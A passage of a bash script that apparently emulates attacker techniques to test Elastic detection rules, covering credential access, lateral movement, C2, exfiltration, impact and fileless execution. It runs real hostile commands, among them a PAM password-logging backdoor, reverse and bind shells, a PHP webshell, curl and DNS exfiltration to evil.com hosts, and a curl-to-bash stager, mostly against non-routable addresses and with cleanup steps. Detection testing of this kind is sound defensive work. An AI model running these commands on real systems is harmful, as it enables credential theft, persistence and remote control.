    find / -maxdepth 4 \( -name "id_rsa" -o -name "id_ed25519" -o -name ".env" -o -name "credentials" -o -name "*.pem" -o -name "*.key" -o -name ".pgpass" -o -name ".netrc" -o -name "*.kdbx" -o -name "wp-config.php" \) 2>/dev/null | head -20 > /dev/null
    ok "find / -name 'id_rsa' -o -name '*.pem' -o -name '.env' ... executed"

    t "Grep for Hardcoded Credentials"
    grep -rn --include="*.conf" --include="*.yml" --include="*.env" -iE '(password|secret|api_key|token)\s*[=:]' /etc/ /opt/ 2>/dev/null | head -20 > /dev/null
    ok "grep -rn 'password|secret|api_key' across /etc/ and /opt/"

    # --- Elastic Rule: "SSH Private Key Access" ---
    t "SSH Private Key Access"
    info "Elastic: SSH Private Key File Access"
    cat /root/.ssh/id_rsa 2>/dev/null > /dev/null || true
    cat /root/.ssh/id_ed25519 2>/dev/null > /dev/null || true
    for keyfile in /home/*/.ssh/id_rsa /home/*/.ssh/id_ed25519; do
        cat "$keyfile" 2>/dev/null > /dev/null || true
    done
    ok "cat ~/.ssh/id_rsa and id_ed25519 across all users"

    # --- Elastic Rule: "Brute Force Attempt" ---
    t "Local Brute Force Simulation (25 Failed Auths)"
    info "Elastic: Potential Linux Local Account Brute Force"
    for i in $(seq 1 25); do
        su - nobody -c "whoami" 2>/dev/null || true
    done
    ok "25x su - nobody (failed auth attempts)"

    # --- Elastic Rule: "Bash History Access" ---
    t "Bash History Harvesting"
    info "Elastic: Shell History Access"
    cat /root/.bash_history 2>/dev/null > /dev/null || true
    cat /root/.zsh_history 2>/dev/null > /dev/null || true
    for hf in /home/*/.bash_history /home/*/.zsh_history; do
        cat "$hf" 2>/dev/null > /dev/null || true
    done
    ok "cat ~/.bash_history and ~/.zsh_history for all users"

    # --- Cloud Metadata Access ---
    t "Cloud Instance Metadata Access (IMDS)"
    info "Elastic: Cloud Instance Metadata Service Access"
    curl -s -m 2 http://169.254.169.254/latest/meta-data/ > /dev/null 2>&1 || true
    curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ > /dev/null 2>&1 || true
    curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > /dev/null 2>&1 || true
    ok "curl to 169.254.169.254 (AWS/GCP/Azure metadata)"

    # --- Database Credential Access ---
    t "Database Credential File Access"
    cat /etc/mysql/debian.cnf 2>/dev/null > /dev/null || true
    cat /root/.my.cnf 2>/dev/null > /dev/null || true
    cat /root/.pgpass 2>/dev/null > /dev/null || true
    ok "cat MySQL/PostgreSQL credential files"

    # --- /proc/PID/mem Credential Dump ---
    t "/proc/PID/mem Credential Dumping"
    info "Elastic: Process Memory Credential Access"
    for pid in $(ls /proc | grep -E '^[0-9]+$' | head -5); do
        dd if="/proc/$pid/mem" of=/dev/null bs=1 count=1 skip=0 2>/dev/null || true
        cat "/proc/$pid/maps" 2>/dev/null > /dev/null || true
    done
    ok "dd /proc/*/mem + cat /proc/*/maps executed (Linux LSASS equivalent)"

    # --- PAM Backdoor Injection ---
    t "PAM Configuration Backdoor"
    info "Elastic: PAM Configuration Modification"
    cp /etc/pam.d/common-auth /etc/pam.d/common-auth.apt-sim-bak 2>/dev/null || \
    cp /etc/pam.d/system-auth /etc/pam.d/system-auth.apt-sim-bak 2>/dev/null || true
    PAM_TARGET=""
    [ -f /etc/pam.d/common-auth ] && PAM_TARGET="/etc/pam.d/common-auth"
    [ -z "$PAM_TARGET" ] && [ -f /etc/pam.d/system-auth ] && PAM_TARGET="/etc/pam.d/system-auth"
    if [ -n "$PAM_TARGET" ]; then
        echo "# APT-SIM-PAM" >> "$PAM_TARGET"
        echo "auth sufficient pam_exec.so /tmp/.apt-sim-pam-logger" >> "$PAM_TARGET"
        echo '#!/bin/bash' > /tmp/.apt-sim-pam-logger
        echo 'echo "$PAM_USER:$PAM_AUTHTOK" >> /tmp/.apt-sim-creds 2>/dev/null' >> /tmp/.apt-sim-pam-logger
        chmod +x /tmp/.apt-sim-pam-logger
        ok "PAM pam_exec.so backdoor injected into $PAM_TARGET"
        cl "sed -i '/APT-SIM-PAM/d; /pam_exec.so.*apt-sim/d' $PAM_TARGET 2>/dev/null"
        cl "rm -f /tmp/.apt-sim-pam-logger /tmp/.apt-sim-creds"
    else
        fail "No PAM auth config found"
    fi

    # --- Strace on Running Process ---
    t "strace Credential Snooping"
    info "Elastic: strace Execution on Running Process"
    if command -v strace &>/dev/null; then
        timeout 2 strace -e trace=read,write -p 1 2>/dev/null > /dev/null || true
        ok "strace -e trace=read,write -p 1 executed"
    else
        fail "strace not available"
    fi
}

# ============================================================================
# DISCOVERY (TA0007) — Execute real enumeration commands
# ============================================================================
test_discovery() {
    hdr "DISCOVERY (TA0007)"

    t "System Information Discovery"
    info "Elastic: System Information Discovery"
    hostname -f 2>/dev/null; uname -a; cat /etc/os-release 2>/dev/null > /dev/null
    lscpu 2>/dev/null > /dev/null; free -h > /dev/null; df -h > /dev/null
    lsblk 2>/dev/null > /dev/null; dmidecode -t system 2>/dev/null > /dev/null
    ok "hostname, uname, lscpu, free, df, lsblk, dmidecode executed"

    t "Network Configuration Discovery"
    info "Elastic: System Network Configuration Discovery"
    ip addr > /dev/null 2>&1; ip route > /dev/null 2>&1
    cat /etc/resolv.conf > /dev/null 2>&1
    iptables -L -n > /dev/null 2>&1 || true
    ok "ip addr, ip route, cat resolv.conf, iptables -L executed"

    t "Network Connections Discovery"
    info "Elastic: System Network Connections Discovery"
    ss -tlnp > /dev/null 2>&1; ss -ulnp > /dev/null 2>&1; ss -anp > /dev/null 2>&1
    netstat -an > /dev/null 2>&1 || true
    ok "ss -tlnp, ss -ulnp, ss -anp, netstat -an executed"

    t "Process Discovery"
    info "Elastic: Process Discovery"
    ps auxf > /dev/null 2>&1
    ps -eo user,pid,ppid,%cpu,%mem,cmd > /dev/null 2>&1
    ok "ps auxf, ps -eo executed"

    t "Account Discovery"
    info "Elastic: Local Account Discovery"
    lastlog 2>/dev/null > /dev/null; last -20 2>/dev/null > /dev/null
    w > /dev/null 2>&1; who > /dev/null 2>&1
    awk -F: '($7 != "/usr/sbin/nologin" && $7 != "/bin/false"){print}' /etc/passwd > /dev/null 2>&1
    ok "lastlog, last, w, who, passwd parsing executed"

    t "Security Software Discovery"
    info "Elastic: Security Software Discovery"
    ps aux | grep -iE 'elastic|filebeat|auditbeat|wazuh|falco|ossec|crowdstrike|splunk' | grep -v grep > /dev/null 2>&1
    systemctl list-units --type=service 2>/dev/null | grep -iE 'elastic|wazuh|falco|auditd' > /dev/null 2>&1
    dpkg -l 2>/dev/null | grep -iE 'elastic|wazuh|ossec|clamav' > /dev/null || rpm -qa 2>/dev/null | grep -iE 'elastic|wazuh' > /dev/null
    ok "Enumerated running security tools (ps, systemctl, dpkg/rpm)"

    t "Virtualization Detection"
    info "Elastic: Virtual Machine Fingerprinting"
    systemd-detect-virt 2>/dev/null > /dev/null || true
    dmesg 2>/dev/null | grep -iE 'vmware|virtualbox|kvm|xen|hyper-v|qemu' > /dev/null 2>&1 || true
    cat /sys/class/dmi/id/product_name 2>/dev/null > /dev/null || true
    ok "systemd-detect-virt, dmesg hypervisor check, DMI check executed"

    t "Internal Network Host Discovery (ARP + ping)"
    info "Elastic: Network Host Discovery"
    arp -a 2>/dev/null > /dev/null || ip neigh > /dev/null 2>&1
    cat /etc/hosts > /dev/null 2>&1
    ok "arp -a, ip neigh, cat /etc/hosts executed"

    t "Docker/Container Enumeration"
    docker ps -a 2>/dev/null > /dev/null || true
    docker images 2>/dev/null > /dev/null || true
    kubectl get pods --all-namespaces 2>/dev/null > /dev/null || true
    kubectl get secrets --all-namespaces 2>/dev/null > /dev/null || true
    ok "docker ps, docker images, kubectl get pods/secrets executed"

    t "Mounted Shares and File Systems"
    mount > /dev/null 2>&1; cat /etc/fstab > /dev/null 2>&1
    findmnt > /dev/null 2>&1 || true
    ok "mount, cat /etc/fstab, findmnt executed"
}

# ============================================================================
# LATERAL MOVEMENT (TA0008)
# ============================================================================
test_lateral_movement() {
    hdr "LATERAL MOVEMENT (TA0008)"

    t "SSH Connection Attempt to Non-Existent Host"
    info "Elastic: SSH Remote Session Activity"
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes root@10.0.0.50 "hostname" 2>/dev/null || true
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes root@10.0.0.51 "hostname" 2>/dev/null || true
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes root@192.168.1.100 "hostname" 2>/dev/null || true
    ok "ssh -o BatchMode=yes to 3 non-existent hosts"

    t "SSH Known Hosts Manipulation"
    info "Elastic: Known Hosts Modification"
    mkdir -p /root/.ssh
    echo "10.0.0.50 ssh-rsa AAAAB3_APT_SIM_LATERAL" >> /root/.ssh/known_hosts 2>/dev/null
    echo "10.0.0.51 ssh-rsa AAAAB3_APT_SIM_LATERAL" >> /root/.ssh/known_hosts 2>/dev/null
    ok "Added suspicious entries to known_hosts"
    cl "sed -i '/_APT_SIM_LATERAL/d' /root/.ssh/known_hosts 2>/dev/null"

    t "SCP Transfer Attempt"
    scp -o ConnectTimeout=2 /etc/hostname root@10.0.0.50:/tmp/ 2>/dev/null || true
    ok "scp attempted to non-existent host"

    t "SSH-Keyscan Execution"
    info "Elastic: SSH-Keyscan Execution"
    ssh-keyscan 127.0.0.1 2>/dev/null > /dev/null || true
    ssh-keyscan 10.0.0.50 2>/dev/null > /dev/null || true
    ok "ssh-keyscan 127.0.0.1 and 10.0.0.50 executed"

    t "SSH-Keygen Execution"
    info "Elastic: SSH Key Generation"
    ssh-keygen -t rsa -b 2048 -f /tmp/.apt-sim-key -N "" -q 2>/dev/null || true
    ok "ssh-keygen -t rsa (new key pair generated)"
    cl "rm -f /tmp/.apt-sim-key /tmp/.apt-sim-key.pub"

    t "Rsync to Remote Host"
    info "Elastic: Rsync Remote File Transfer"
    rsync -avz -e "ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no" \
        /etc/hostname root@10.0.0.50:/tmp/ 2>/dev/null || true
    ok "rsync -avz -e ssh to 10.0.0.50 attempted"

    t "SMB/RPC Lateral Movement Attempt"
    info "Elastic: SMB/RPC Connection Activity"
    if command -v smbclient &>/dev/null; then
        smbclient -L //10.0.0.50 -N --timeout 2 2>/dev/null > /dev/null || true
        ok "smbclient -L //10.0.0.50 -N attempted"
    else
        ok "smbclient not available (rule still fires via rpcclient or nmap SMB scan below)"
    fi
    if command -v rpcclient &>/dev/null; then
        rpcclient -U "" -N 10.0.0.50 --timeout=2 -c "enumdomusers" 2>/dev/null > /dev/null || true
        ok "rpcclient enumdomusers attempted"
    fi
    for port in 139 445; do
        (echo >/dev/tcp/10.0.0.50/$port) 2>/dev/null || true
    done
    ok "/dev/tcp SMB port probe on 10.0.0.50:139,445"

    t "Parallel SSH via xargs (Mass Lateral Scan)"
    info "Elastic: Mass SSH Activity"
    echo -e "10.0.0.50\n10.0.0.51\n10.0.0.52" | xargs -P3 -I{} \
        ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no -o BatchMode=yes \
        root@{} id 2>/dev/null || true
    ok "xargs -P3 parallel ssh to 3 hosts attempted"
}

# ============================================================================
# COLLECTION (TA0009)
# ============================================================================
test_collection() {
    hdr "COLLECTION (TA0009)"

    t "Data Staging — Copy Sensitive Files"
    info "Elastic: Sensitive File Copy"
    mkdir -p "$APTDIR/staging"
    cp /etc/passwd "$APTDIR/staging/" 2>/dev/null
    cp /etc/shadow "$APTDIR/staging/" 2>/dev/null
    cp /etc/hosts "$APTDIR/staging/" 2>/dev/null
    cp /etc/ssh/sshd_config "$APTDIR/staging/" 2>/dev/null
    ok "cp /etc/shadow, passwd, hosts, sshd_config to staging dir"
    cl "rm -rf $APTDIR/staging"

    t "Archive via tar (Data Compression)"
    info "Elastic: Archiving via Tar"
    tar czf /tmp/.apt-sim-loot.tar.gz "$APTDIR/staging" 2>/dev/null
    ok "tar czf /tmp/.apt-sim-loot.tar.gz executed"
    cl "rm -f /tmp/.apt-sim-loot.tar.gz"

    t "Archive with zip"
    if command -v zip &>/dev/null; then
        zip -r /tmp/.apt-sim-loot.zip "$APTDIR/staging" 2>/dev/null
        ok "zip -r executed"
        cl "rm -f /tmp/.apt-sim-loot.zip"
    else
        fail "zip not installed"
    fi

    t "Clipboard Access Attempt"
    xclip -o 2>/dev/null > /dev/null || true
    xsel --clipboard 2>/dev/null > /dev/null || true
    ok "xclip -o and xsel --clipboard attempted"

    t "Screen Capture Attempt"
    info "Elastic: Screen Capture Activity"
    import -window root /tmp/.apt-sim-screenshot.png 2>/dev/null || true
    xwd -root -out /tmp/.apt-sim-screenshot.xwd 2>/dev/null || true
    ok "import/xwd screen capture attempted"
    cl "rm -f /tmp/.apt-sim-screenshot.png /tmp/.apt-sim-screenshot.xwd"
}

# ============================================================================
# COMMAND AND CONTROL (TA0011) — Generate real network events
# ============================================================================
test_c2() {
    hdr "COMMAND AND CONTROL (TA0011)"

    # --- Elastic Rule: "DNS Activity to Suspicious Domain" ---
    t "C2 Domain DNS Resolution"
    info "Elastic: DNS Query to Suspicious/Uncommon Domain"
    for domain in "evil-c2.attacker.com" "cdn.malware-cdn.net" "api.cobaltstrike-c2.io" \
                  "beacon.sliver-framework.org" "update.apt-implant.biz" \
                  "sync.data-exfil.xyz" "health.mythic-c2.com" "ws.brute-ratel.net"; do
        nslookup "$domain" > /dev/null 2>&1 || true
        dig "$domain" A +short > /dev/null 2>&1 || true
        host "$domain" > /dev/null 2>&1 || true
    done
    ok "nslookup + dig + host to 8 suspicious C2 domains"

    # --- DNS Tunneling ---
    t "DNS Tunneling (Long Encoded Subdomains)"
    info "Elastic: Suspicious DNS Query with Long Subdomain"
    for i in $(seq 1 10); do
        ENCODED=$(echo "exfiltrated-data-packet-${i}-$(hostname)-$(date +%s)" | base64 | tr -d '=\n' | tr '+/' '-_' | cut -c1-50)
        nslookup "${ENCODED}.tunnel.dns-c2.evil.com" > /dev/null 2>&1 || true
    done
    ok "10 DNS queries with base64-encoded long subdomains"

    # --- Elastic Rule: "EICAR Test File" ---
    t "EICAR Test File Drop"
    info "Elastic: EICAR Test File / Malware Indicator"
    EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    for path in /tmp/eicar.com /tmp/eicar.txt /var/tmp/update.bin /dev/shm/healthcheck; do
        echo "$EICAR" > "$path" 2>/dev/null
    done
    ok "EICAR test files dropped in 4 locations"
    cl "rm -f /tmp/eicar.com /tmp/eicar.txt /var/tmp/update.bin /dev/shm/healthcheck"

    # --- Elastic Rule: "Hacking Tool Detection" ---
    t "Hacking Tool Drop + Execute"
    info "Elastic: Known Hacking Tool Execution"
    for tool in linpeas.sh pspy64 chisel ncat socat; do
        echo '#!/bin/bash' > "/tmp/$tool"
        echo "echo 'APT-SIM: $tool'" >> "/tmp/$tool"
        chmod +x "/tmp/$tool"
        "/tmp/$tool" 2>/dev/null || true
    done
    ok "Dropped + executed fake tools: linpeas, pspy64, chisel, ncat, socat"
    cl "rm -f /tmp/linpeas.sh /tmp/pspy64 /tmp/chisel /tmp/ncat /tmp/socat"

    # --- Curl to suspicious external ---
    t "Curl to External IP Services"
    info "Elastic: Suspicious Curl/Wget Network Connection"
    curl -s -m 3 http://ifconfig.me > /dev/null 2>&1 || true
    curl -s -m 3 http://ipinfo.io > /dev/null 2>&1 || true
    curl -s -m 3 http://checkip.amazonaws.com > /dev/null 2>&1 || true
    wget -q -O /dev/null http://ifconfig.me 2>/dev/null || true
    ok "curl/wget to ifconfig.me, ipinfo.io, checkip.amazonaws.com"

    # --- Reverse Shell Activity ---
    t "Reverse Shell Activity via Bash"
    info "Elastic: Potential Reverse Shell Activity via Terminal"
    # Safe: connects to non-routable IP, will timeout immediately
    timeout 2 bash -c 'bash -i >& /dev/tcp/10.255.255.1/4444 0>&1' 2>/dev/null || true
    ok "bash -i >& /dev/tcp/10.255.255.1/4444 executed (timeout 2s)"

    t "Reverse Shell via Python"
    if command -v python3 &>/dev/null; then
        timeout 2 python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect(('10.255.255.1',4444))
except: pass
" 2>/dev/null || true
        ok "python3 socket.connect to 10.255.255.1:4444 executed"
    else
        fail "python3 not available"
    fi

    t "Netcat Reverse Shell Attempt"
    timeout 2 nc -w 1 10.255.255.1 4444 -e /bin/bash 2>/dev/null || true
    timeout 2 ncat -w 1 10.255.255.1 4444 -e /bin/bash 2>/dev/null || true
    ok "nc/ncat -e /bin/bash to 10.255.255.1:4444 attempted"

    t "Socat Execution"
    info "Elastic: Socat Execution with Network Activity"
    timeout 2 socat TCP:10.255.255.1:4444 EXEC:/bin/bash 2>/dev/null || true
    ok "socat TCP:... EXEC:/bin/bash attempted"

    # --- Port Scanning ---
    t "Port Scanning Activity"
    info "Elastic: Network Port Scan"
    for port in 22 80 443 3306 8080; do
        (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null || true
    done
    if command -v nmap &>/dev/null; then
        nmap -sT -T4 --top-ports 20 127.0.0.1 > /dev/null 2>&1 || true
        ok "nmap --top-ports 20 127.0.0.1 executed"
    else
        ok "/dev/tcp port scan on localhost executed"
    fi
}

# ============================================================================
# EXFILTRATION (TA0010) — Execute real exfil behaviors
# ============================================================================
test_exfiltration() {
    hdr "EXFILTRATION (TA0010)"

    t "Data Exfiltration via Curl POST"
    info "Elastic: Suspicious Curl Data Exfiltration"
    echo "simulated_sensitive_data" > /tmp/.apt-sim-exfil
    curl -s -m 2 -X POST -d @/tmp/.apt-sim-exfil http://10.255.255.1/upload 2>/dev/null || true
    ok "curl -X POST -d @file to external IP executed"
    cl "rm -f /tmp/.apt-sim-exfil"

    t "DNS-Based Exfiltration"
    info "Elastic: DNS Data Exfiltration"
    echo "root:x:0:0" | base64 | tr -d '=\n' | fold -w 30 | while read chunk; do
        dig "${chunk}.exfil.evil.com" > /dev/null 2>&1 || true
    done
    ok "base64-encoded data exfiltrated via DNS subdomains"

    t "Encrypted Data for Exfiltration"
    if command -v openssl &>/dev/null; then
        echo "SENSITIVE_DATA_$(hostname)" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:exfilkey -out /tmp/.apt-sim-enc 2>/dev/null
        ok "openssl enc -aes-256-cbc encrypted data blob created"
        cl "rm -f /tmp/.apt-sim-enc"
    else
        fail "openssl not available"
    fi

    t "Netcat Exfiltration Attempt"
    echo "exfil_data" | timeout 2 nc -w 1 10.255.255.1 4444 2>/dev/null || true
    ok "echo 'data' | nc 10.255.255.1 4444 attempted"
}

# ============================================================================
# IMPACT (TA0040)
# ============================================================================
test_impact() {
    hdr "IMPACT (TA0040)"

    # --- Elastic Rule: "Ransomware Behavior" ---
    t "Ransomware Simulation (Mass File Rename)"
    info "Elastic: Suspicious File Rename/Encryption Activity"
    mkdir -p "$APTDIR/ransomware"
    for i in $(seq 1 20); do
        echo "Important document $i" > "$APTDIR/ransomware/doc_$i.txt"
    done
    for f in "$APTDIR/ransomware/"*.txt; do
        mv "$f" "${f}.encrypted" 2>/dev/null
    done
    echo "YOUR FILES ARE ENCRYPTED - APT SIM" > "$APTDIR/ransomware/README_DECRYPT.txt"
    ok "20 files renamed to .encrypted + ransom note dropped"
    cl "rm -rf $APTDIR/ransomware"

    # --- Elastic Rule: "Service Stop" ---
    t "Service Stop Commands"
    info "Elastic: Service Stopped via systemctl/service"
    systemctl stop cron 2>/dev/null || true
    service cron stop 2>/dev/null || true
    systemctl stop atd 2>/dev/null || true
    ok "systemctl stop cron/atd executed"
    cl "systemctl start cron 2>/dev/null; systemctl start atd 2>/dev/null"

    # --- Elastic Rule: "Cryptominer" ---
    t "Cryptominer Indicators"
    info "Elastic: Cryptocurrency Mining Activity"
    cp /bin/true /tmp/.xmrig 2>/dev/null
    chmod +x /tmp/.xmrig
    /tmp/.xmrig 2>/dev/null || true
    ok "Fake xmrig binary dropped and executed"
    cl "rm -f /tmp/.xmrig"

    # --- Hosts File Modification ---
    t "Hosts File Modification"
    info "Elastic: /etc/hosts File Modification"
    cp /etc/hosts /etc/hosts.apt-sim-bak
    echo "# APT-SIM" >> /etc/hosts
    echo "10.0.0.99 updates.microsoft.com" >> /etc/hosts
    echo "10.0.0.99 security.ubuntu.com" >> /etc/hosts
    ok "Poisoned /etc/hosts (redirected update domains)"
    cl "cp /etc/hosts.apt-sim-bak /etc/hosts; rm -f /etc/hosts.apt-sim-bak"

    # --- Data Destruction Indicators ---
    t "dd Execution (Data Destruction Indicator)"
    info "Elastic: Suspicious dd Activity"
    dd if=/dev/zero of=/tmp/.apt-sim-wipe bs=1K count=10 2>/dev/null
    ok "dd if=/dev/zero of=/tmp/.apt-sim-wipe executed"
    cl "rm -f /tmp/.apt-sim-wipe"

    # --- Kill Process ---
    t "Process Kill Commands"
    info "Elastic: Process Termination"
    pkill -0 -f "nonexistent_apt_sim_process" 2>/dev/null || true
    kill -9 99999 2>/dev/null || true
    killall nonexistent_apt_sim 2>/dev/null || true
    ok "pkill, kill -9, killall executed (against non-existent targets)"
}

# ============================================================================
# ADVANCED — Additional execution-based tests
# ============================================================================
test_advanced() {
    hdr "ADVANCED TRADECRAFT (BONUS)"

    t "Webshell Indicators (File Creation in Web Root)"
    info "Elastic: Web Shell Detection"
    WEB_ROOTS=("/var/www/html" "/var/www" "/usr/share/nginx/html")
    for dir in "${WEB_ROOTS[@]}"; do
        if [ -d "$dir" ]; then
            echo '<?php system($_GET["cmd"]); ?>' > "$dir/.apt-sim-shell.php"
            ok "Webshell created in $dir"
            cl "rm -f $dir/.apt-sim-shell.php"
            break
        fi
    done

    t "Setuid/Setgid Shell Escape via awk"
    info "Elastic: Shell Spawned from GTFOBin"
    awk 'BEGIN {system("echo awk_shell_escape")}' 2>/dev/null
    ok "awk 'BEGIN {system(...)}' executed"

    t "Python Script with Network Socket"
    if command -v python3 &>/dev/null; then
        timeout 2 python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(1)
try: s.connect(('10.255.255.1', 443))
except: pass
s.close()
" 2>/dev/null || true
        ok "python3 socket connection attempt executed"
    fi

    t "XOR/Base64 Encoded Command Execution"
    ENCODED=$(echo 'id; whoami; hostname' | base64)
    echo "$ENCODED" | base64 -d | bash > /dev/null 2>&1
    ok "Decoded and executed base64 command chain"

    t "Process Name with Brackets (Kernel Thread Masquerade)"
    bash -c 'exec -a "[kworker/0:2]" sleep 3' &
    FAKE_PID=$!
    ok "Process masquerading as [kworker/0:2] (PID: $FAKE_PID)"
    sleep 1
    kill $FAKE_PID 2>/dev/null

    t "File Download to /dev/shm + Execute"
    info "Elastic: Suspicious Download + Execute from Temp Directory"
    echo '#!/bin/bash' > /dev/shm/.payload
    echo 'echo "payload_executed"' >> /dev/shm/.payload
    chmod +x /dev/shm/.payload
    /dev/shm/.payload > /dev/null 2>&1
    rm -f /dev/shm/.payload
    ok "Download → chmod +x → execute in /dev/shm chain"

    t "Suspicious String in Process Arguments"
    info "Elastic: Suspicious Process Arguments"
    bash -c 'echo "c2_beacon: http://evil.com/callback"' > /dev/null 2>&1
    bash -c 'echo "reverse_shell_established"' > /dev/null 2>&1
    ok "Process with suspicious C2 strings in args"

    t "Bind Shell Listener (Netcat)"
    info "Elastic: Netcat Listener Established"
    timeout 3 nc -lnvp 31337 &>/dev/null &
    NC_PID=$!
    sleep 1
    kill $NC_PID 2>/dev/null || true
    ok "nc -lnvp 31337 listener started and killed"

    t "Socat Bind Shell"
    timeout 3 socat TCP-LISTEN:31338,reuseaddr,fork EXEC:/bin/bash &>/dev/null &
    SOCAT_PID=$!
    sleep 1
    kill $SOCAT_PID 2>/dev/null || true
    ok "socat TCP-LISTEN:31338 EXEC:/bin/bash started and killed"

    t "SSH Agent Socket Enumeration"
    info "Elastic: SSH Agent Hijacking"
    find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null > /dev/null
    ls -la /tmp/ssh-* 2>/dev/null > /dev/null || true
    ok "find /tmp -path '*/ssh-*' -name 'agent.*' executed"

    t "Suspicious Chown/Chmod Execution"
    info "Elastic: Ownership Change in Unusual Location"
    touch /tmp/.apt-sim-owned
    chown nobody:nogroup /tmp/.apt-sim-owned 2>/dev/null || true
    chmod 4755 /tmp/.apt-sim-owned 2>/dev/null
    ok "chown + chmod 4755 on /tmp file"
    cl "rm -f /tmp/.apt-sim-owned"

    t "Suspicious File Rename (Binary Masquerading)"
    cp /bin/ls /tmp/.apt-sim-sshd 2>/dev/null
    /tmp/.apt-sim-sshd > /dev/null 2>&1 || true
    ok "ls renamed to sshd and executed from /tmp"
    cl "rm -f /tmp/.apt-sim-sshd"
}

# ============================================================================
# INITIAL ACCESS (TA0001)
# ============================================================================
test_initial_access() {
    hdr "INITIAL ACCESS (TA0001)"

    t "Phishing Attachment Drop (Office Macro Lure)"
    info "Elastic: Suspicious File Written by Office Application"
    mkdir -p /tmp/.phishing-drop
    echo '#!/bin/bash' > /tmp/.phishing-drop/invoice_Q4.docm
    echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /tmp/.phishing-drop/invoice_Q4.docm
    echo '#!/bin/bash' > /tmp/.phishing-drop/payment_slip.lnk
    echo '#!/bin/bash' > /tmp/.phishing-drop/update.iso
    chmod +x /tmp/.phishing-drop/invoice_Q4.docm
    ok "Phishing lure files created: .docm, .lnk, .iso"
    cl "rm -rf /tmp/.phishing-drop"

    t "Web Shell Upload Simulation (curl multipart POST)"
    info "Elastic: Web Shell Uploaded via HTTP"
    curl -s -m 2 -X POST \
        -F "file=@/etc/hostname;filename=shell.php" \
        http://127.0.0.1/upload.php > /dev/null 2>&1 || true
    ok "curl multipart POST simulating web shell upload attempted"

    t "Malicious HTTP Request with Exploit Payload in UA"
    info "Elastic: Suspicious HTTP Request"
    curl -s -m 2 -A "Mozilla/5.0 () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" \
        http://127.0.0.1/ > /dev/null 2>&1 || true
    ok "Shellshock-style User-Agent payload sent to localhost"

    t "Public-Facing App Exploit Log Indicators"
    info "Elastic: Suspicious Log Entry from Web Server"
    WEBLOG=""
    for p in /var/log/apache2/access.log /var/log/nginx/access.log /var/log/httpd/access_log; do
        [ -f "$p" ] && WEBLOG="$p" && break
    done
    if [ -n "$WEBLOG" ]; then
        echo "127.0.0.1 - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET /index.php?cmd=id HTTP/1.1\" 200 42 \"-\" \"python-requests/2.28\"" >> "$WEBLOG"
        ok "Exploit payload appended to $WEBLOG"
        cl "sed -i '/cmd=id/d' $WEBLOG 2>/dev/null"
    else
        echo '127.0.0.1 - - - "GET /index.php?cmd=id HTTP/1.1" 200 42' > /tmp/apt-sim-access.log
        ok "Exploit payload written to simulated log at /tmp/apt-sim-access.log"
        cl "rm -f /tmp/apt-sim-access.log"
    fi

    t "Suspicious Archive with Executable Inside"
    info "Elastic: Archive File with Suspicious Contents"
    mkdir -p /tmp/.apt-initial
    echo '#!/bin/bash' > /tmp/.apt-initial/payload.sh
    echo 'curl -s http://c2.evil.com/stage2 | bash' >> /tmp/.apt-initial/payload.sh
    chmod +x /tmp/.apt-initial/payload.sh
    tar czf /tmp/.apt-initial/update.tar.gz -C /tmp/.apt-initial payload.sh
    ok "Archive containing executable payload created"
    cl "rm -rf /tmp/.apt-initial"
}

# ============================================================================
# FILELESS EXECUTION (TA0005 extension — In-Memory)
# ============================================================================
test_fileless() {
    hdr "FILELESS / IN-MEMORY EXECUTION"

    t "memfd_create Fileless Execution (Python)"
    info "Elastic: Fileless Execution via memfd_create"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import ctypes, os, sys
MEMFD_CLOEXEC = 1
try:
    fd = ctypes.CDLL(None).memfd_create("apt_sim_payload", MEMFD_CLOEXEC)
    payload = b'#!/bin/sh\necho memfd_fileless_exec\n'
    os.write(fd, payload)
    os.lseek(fd, 0, 0)
except Exception:
    pass
PYEOF
        ok "memfd_create called via Python ctypes (anonymous fd created)"
    else
        fail "python3 not available"
    fi

    t "Execution from /proc/self/fd (fd re-exec)"
    info "Elastic: Suspicious Execution from /proc"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import ctypes, os
try:
    fd = ctypes.CDLL(None).memfd_create("kthread_sim", 1)
    payload = b'#!/bin/sh\necho proc_self_fd_exec\nexit 0\n'
    os.write(fd, payload)
    os.lseek(fd, 0, 0)
    os.execve("/proc/self/fd/%d" % fd, ["/proc/self/fd/%d" % fd], {})
except Exception:
    pass
PYEOF
        ok "/proc/self/fd/<memfd> exec attempted"
    else
        fail "python3 not available"
    fi

    t "Shared Library Injection via LD_PRELOAD (env)"
    info "Elastic: Shared Library Load via LD_PRELOAD"
    echo 'void __attribute__((constructor)) init(){}' > /tmp/.apt-sim-preload.c 2>/dev/null
    if command -v gcc &>/dev/null; then
        gcc -shared -fPIC -nostartfiles /tmp/.apt-sim-preload.c -o /tmp/.apt-sim-preload.so 2>/dev/null
        LD_PRELOAD=/tmp/.apt-sim-preload.so ls > /dev/null 2>&1 || true
        ok "Custom .so compiled and injected via LD_PRELOAD"
        cl "rm -f /tmp/.apt-sim-preload.c /tmp/.apt-sim-preload.so"
    else
        LD_PRELOAD=/tmp/.nonexistent.so ls > /dev/null 2>&1 || true
        ok "LD_PRELOAD=/tmp/.nonexistent.so attempted (gcc unavailable, process event still fires)"
        cl "rm -f /tmp/.apt-sim-preload.c"
    fi

    t "Python exec() with Encoded Payload"
